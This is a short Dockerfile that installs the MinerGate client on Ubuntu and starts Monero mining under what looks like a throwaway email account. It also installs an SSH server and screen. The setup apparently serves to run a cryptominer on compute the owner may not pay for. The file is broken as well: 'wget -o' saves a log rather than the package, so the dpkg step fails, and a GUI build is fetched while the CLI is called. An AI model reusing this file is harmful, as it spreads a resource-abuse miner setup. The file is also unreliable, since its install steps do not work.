FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"] 

RUN apt-get update && apt-get install -y \
    build-essential \
    gcc \
    curl \
    make \
    screen \
    openssh-client \
    openssh-server \
    wget

WORKDIR /root
RUN wget -o ./minergate.deb https://minergate.com/download/xfast-ubuntu-gui-amd
RUN dpkg -i minergate.deb

RUN minergate-cli --user "fewa342rwr@tutanota.com" --xmr 2